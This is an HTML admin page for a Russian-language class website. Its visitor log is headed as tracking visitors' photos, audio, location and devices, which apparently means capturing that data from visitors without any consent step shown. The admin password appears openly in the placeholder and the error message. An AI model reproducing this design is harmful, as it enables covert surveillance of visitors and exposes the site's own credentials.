<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - GHOF Russian Class</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-[#070d1b] text-white font-['Plus_Jakarta_Sans',sans-serif] min-h-screen p-4 md:p-8">

    <div class="max-w-6xl mx-auto bg-[#0b132b] border-2 border-[#C5A059] rounded-3xl p-6 md:p-8 shadow-2xl">
        <div class="flex justify-between items-center mb-6 border-b border-gray-800 pb-4">
            <div class="flex items-center space-x-3">
                <img src="logo.png" alt="Logo" class="w-10 h-10 rounded-full border border-[#C5A059] object-cover">
                <div>
                    <span class="text-xs text-[#C5A059] font-semibold uppercase tracking-widest">GHOF Language Academy</span>
                    <h1 class="text-xl font-bold font-['Cinzel'] text-white">Panel Pantau Pengunjung & Admin</h1>
                </div>
            </div>
            <a href="index.html" class="text-xs text-gray-400 hover:text-[#C5A059] border border-gray-700 px-3 py-1.5 rounded-lg transition">
                <i class="fa-solid fa-arrow-left mr-1"></i> Ke Website Utama
            </a>
        </div>

        <!-- Login Admin -->
        <div id="admin-login-view" class="max-w-md mx-auto py-12">
            <p class="text-xs text-gray-400 mb-6 text-center">Masukkan sandi admin untuk melihat data pengunjung yang masuk.</p>
            <input type="password" id="admin-password" placeholder="Password (ghof2026)" class="w-full bg-[#070d1b] border border-gray-700 rounded-xl px-4 py-3 text-sm text-white mb-4 focus:border-[#C5A059] focus:outline-none">
            <button onclick="verifyAdmin()" class="w-full bg-[#C5A059] text-[#070d1b] font-bold py-3.5 rounded-xl hover:opacity-90 transition shadow-lg">
                Masuk ke Dashboard
            </button>
            <p id="login-error" class="text-red-400 text-xs mt-3 text-center hidden">Password salah! Gunakan: ghof2026</p>
        </div>

        <!-- Dashboard Admin -->
        <div id="admin-dashboard-view" class="hidden space-y-8">
            <div class="flex justify-between items-center bg-[#070d1b] p-4 rounded-xl border border-gray-800">
                <div class="flex items-center space-x-3">
                    <div class="w-3 h-3 bg-green-500 rounded-full animate-ping"></div>
                    <span class="text-sm font-bold text-green-400">Status: Sesi Admin Aktif & Memantau</span>
                </div>
                <button onclick="logoutAdmin()" class="text-xs text-red-400 hover:underline">Keluar</button>
            </div>

            <!-- Buat Pengumuman Live -->
            <div class="bg-[#070d1b] border border-[#C5A059]/40 p-5 rounded-2xl shadow-lg">
                <h4 class="text-sm font-bold text-white mb-2"><span class="text-[#C5A059]">📢</span> Buat Pengumuman Live di Web</h4>
                <input type="text" id="admin-announcement-input" placeholder="Tulis pengumuman..." class="w-full bg-[#0b132b] border border-gray-700 rounded-xl px-4 py-2.5 text-xs text-white mb-3 focus:border-[#C5A059] focus:outline-none">
                <button onclick="saveAnnouncement()" class="bg-[#C5A059] text-[#070d1b] font-bold text-xs px-4 py-2 rounded-lg hover:opacity-90 transition">
                    Publikasikan Pengumuman
                </button>
            </div>

            <!-- TABEL PEMANTAU PENGUNJUNG (FOTO, AUDIO, LOKASI & DEVICE) -->
            <div>
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-lg font-bold font-['Cinzel'] text-[#C5A059]">
                        <i class="fa-solid fa-users-viewfinder mr-2"></i> Log & Pantau Pengunjung Masuk (<span id="visitor-count">0</span>)
                    </h3>
                    <button onclick="clearVisitors()" class="text-xs text-red-400 hover:underline">Hapus Semua Log</button>
                </div>
                
                <div id="visitor-list" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <!-- Data pengunjung dirender otomatis via JS -->
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
